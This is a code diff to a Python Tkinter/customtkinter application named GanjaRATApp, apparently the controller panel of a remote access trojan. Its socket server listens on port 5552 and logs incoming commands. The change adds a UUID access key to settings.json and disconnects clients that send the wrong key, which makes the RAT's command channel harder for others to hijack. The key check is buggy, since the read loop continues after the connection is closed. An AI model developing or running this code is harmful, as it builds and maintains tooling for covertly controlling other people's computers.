@@ -3,6 +3,7 @@ import socket
 import pygame
 import os
 import json
+import uuid
 import queue
 import threading
 from tkinter import messagebox
@@ -13,10 +14,23 @@ pygame.mixer.init()
 
 SETTINGS_FILE = "settings.json"
 DEFAULT_SETTINGS = {
+    "key": 0,
     "host": "127.0.0.1",
     "port": 5552,
     "theme": "default"
 }
+
+def create_key():
+    try:
+        data = load_settings()
+        if data["key"] == 0:
+            unique_key = str(uuid.uuid4())
+            data["key"] = unique_key
+            with open(SETTINGS_FILE, "w", encoding="utf-8") as file:
+                json.dump(data, file, indent=4, ensure_ascii=False)
+            
+    except Exception as e:
+        print(f"Error in create key! {e}")
 
 def load_settings():
     if not os.path.exists(SETTINGS_FILE):
@@ -45,6 +59,9 @@ class Server:
         self.running = False  
 
         self.msg_queue = queue.Queue()
+
+        self.data = load_settings()
+        self.key = self.data["key"]
 
     def start_server(self):
         self.running = True
@@ -87,6 +104,13 @@ class Server:
                 while self.running:
                     command = conn.recv(1024).decode('utf-8').strip()
                     print(f"[+] Сообщения от {addr}: {command}")
+
+                    if "key" in command:
+                        k = command[3:].strip()
+                        if k != self.key:
+                            conn.send("exit".encode('utf-8'))
+                            conn.close()
+
                     if not command:
                         break  
                     
@@ -211,6 +235,8 @@ class GanjaRATApp(ctk.CTk):
 
         self.load = load_settings()
         self.HOST, self.PORT = self.load['host'], self.load['port']
+
+        create_key()
 
         self.server = Server(self.HOST, self.PORT, self)
 
@@ -358,6 +384,7 @@ class InfoApp(ctk.CTkToplevel):
         self.about_text = ctk.CTkLabel(self.info_frame, text='about about anou about about anouabout about \n anouabout about anouabout about anouabout\n about anouabout about anouabout about anouabout\n about anou',
                                         font=('Bold', 18))
         self.about_text.pack(side='top', pady=5)
+
 
 class ConfigApp(ctk.CTkToplevel): 
     def __init__(self, parent):
